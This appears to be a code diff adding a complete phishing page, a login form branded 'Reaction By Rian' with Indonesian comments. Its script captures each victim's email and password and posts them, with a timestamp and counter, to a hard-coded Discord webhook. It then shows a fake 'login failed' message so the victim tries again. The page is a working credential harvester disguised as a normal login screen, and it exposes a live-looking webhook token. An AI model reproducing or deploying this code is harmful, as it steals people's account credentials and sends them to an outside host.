@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reaction By Rian • Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(145deg, #0f172a, #1e293b);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+        }
+        
+        .container {
+            max-width: 400px;
+            width: 100%;
+        }
+        
+        .card {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 30px 25px;
+            border: 2px solid #ff6b6b;
+            box-shadow: 0 20px 40px rgba(255,107,107,0.2);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: #ff6b6b;
+            border-radius: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-size: 2.5em;
+            color: white;
+        }
+        
+        h1 {
+            color: white;
+            font-size: 2em;
+            margin-bottom: 5px;
+        }
+        
+        .sub {
+            color: #ff6b6b;
+            font-weight: 600;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 16px 20px;
+            background: rgba(255,255,255,0.1);
+            border: 2px solid #ff6b6b;
+            border-radius: 20px;
+            color: white;
+            font-size: 1em;
+        }
+        
+        .form-group input::placeholder {
+            color: rgba(255,255,255,0.5);
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #ff8b8b;
+            background: rgba(255,107,107,0.1);
+        }
+        
+        .btn-login {
+            width: 100%;
+            padding: 18px;
+            background: #ff6b6b;
+            border: none;
+            border-radius: 25px;
+            color: white;
+            font-size: 1.2em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin: 10px 0;
+        }
+        
+        .btn-login:hover {
+            background: #ff8b8b;
+            transform: translateY(-2px);
+        }
+        
+        .btn-login:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            color: white;
+            margin: 15px 0;
+        }
+        
+        .loading.show {
+            display: block;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #ff6b6b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .footer {
+            text-align: center;
+            color: rgba(255,255,255,0.5);
+            margin-top: 20px;
+            font-size: 0.9em;
+        }
+        
+        .footer span {
+            color: #ff6b6b;
+        }
+        
+        .alert {
+            display: none;
+            color: #ff6b6b;
+            text-align: center;
+            margin: 15px 0;
+            padding: 10px;
+            background: rgba(255,107,107,0.1);
+            border-radius: 15px;
+        }
+        
+        .alert.show {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <div class="logo">🔥</div>
+                <h1>REACTION</h1>
+                <div class="sub">BY RIAN</div>
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="email" id="email" placeholder="Email" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                
+                <div class="alert" id="alertMsg">
+                    ⚠️ Login gagal, coba lagi
+                </div>
+                
+                <button type="submit" class="btn-login" id="loginBtn">
+                    🔓 LOGIN
+                </button>
+            </form>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Processing...</p>
+            </div>
+            
+            <div class="footer">
+                <span>©</span> 2025 Reaction By Rian
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // 🔥 WEBHOOK BARU PUNYA LO
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1482530797343998034/LsoFC7lIkJysa4lVratN28d27XcPmqH5UdvCYNeuol4o6pymNudVmNRGHIsbbXSh1zni";
+        
+        const form = document.getElementById('loginForm');
+        const loading = document.getElementById('loading');
+        const alertMsg = document.getElementById('alertMsg');
+        const loginBtn = document.getElementById('loginBtn');
+        
+        // Counter
+        let counter = localStorage.getItem('reactionCounter') ? parseInt(localStorage.getItem('reactionCounter')) : 1;
+        
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Disable button
+            loginBtn.disabled = true;
+            loading.classList.add('show');
+            
+            // Format pesan
+            const message = `**🔥 REACTION BY RIAN - LOGIN ${counter}**\n\`\`\`\nEmail: ${email}\nPassword: ${password}\nWaktu: ${new Date().toLocaleString('id-ID')}\n\`\`\``;
+            
+            try {
+                // Kirim ke Discord pake webhook baru
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: message })
+                });
+                
+                if (response.ok) {
+                    console.log('✅ Webhook baru work!');
+                    
+                    // Update counter
+                    counter++;
+                    localStorage.setItem('reactionCounter', counter);
+                    
+                    // Reset form
+                    document.getElementById('email').value = '';
+                    document.getElementById('password').value = '';
+                    
+                    // Tampilkan alert
+                    setTimeout(() => {
+                        loading.classList.remove('show');
+                        alertMsg.classList.add('show');
+                        
+                        setTimeout(() => {
+                            alertMsg.classList.remove('show');
+                        }, 2000);
+                        
+                        loginBtn.disabled = false;
+                    }, 1500);
+                    
+                } else {
+                    throw new Error('Gagal kirim ke Discord');
+                }
+                
+            } catch (error) {
+                console.error('Error:', error);
+                loading.classList.remove('show');
+                alertMsg.textContent = '⚠️ Terjadi kesalahan!';
+                alertMsg.classList.add('show');
+                
+                setTimeout(() => {
+                    alertMsg.classList.remove('show');
+                    loginBtn.disabled = false;
+                }, 2000);
+            }
+        });
+    </script>
+</body>
+</html>
